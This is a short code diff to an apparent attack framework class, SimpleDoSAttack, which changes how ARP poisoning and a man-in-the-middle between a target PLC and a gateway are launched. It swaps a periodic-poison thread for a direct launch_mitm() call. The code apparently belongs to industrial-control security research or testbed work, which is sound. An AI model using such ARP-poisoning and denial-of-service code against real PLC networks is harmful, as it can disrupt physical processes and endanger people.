@@ -68,13 +68,13 @@ class SimpleDoSAttack(SyncedAttack):
         self.logger.info(f"NFqueue Bound periodic ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-
-        self.run_thread = True
+        self.launch_mitm()
+        #self.run_thread = True
         # Are we returning from this? No, we are not
-        _thread.start_new_thread(self.launch_periodic_poison, (self.ARP_POISON_PERIOD, 0))
+        #_thread.start_new_thread(self.launch_periodic_poison, (self.ARP_POISON_PERIOD, 0))
         #self.launch_mitm()
-        self.logger.info(f"Configured periodic ARP Poison between {self.target_plc_ip} and "
-                          f"{self.intermediate_attack['gateway_ip']}")
+        #self.logger.info(f"Configured periodic ARP Poison between {self.target_plc_ip} and "
+        #                  f"{self.intermediate_attack['gateway_ip']}")
 
     def launch_periodic_poison(self, period, delay):
         while self.run_thread:
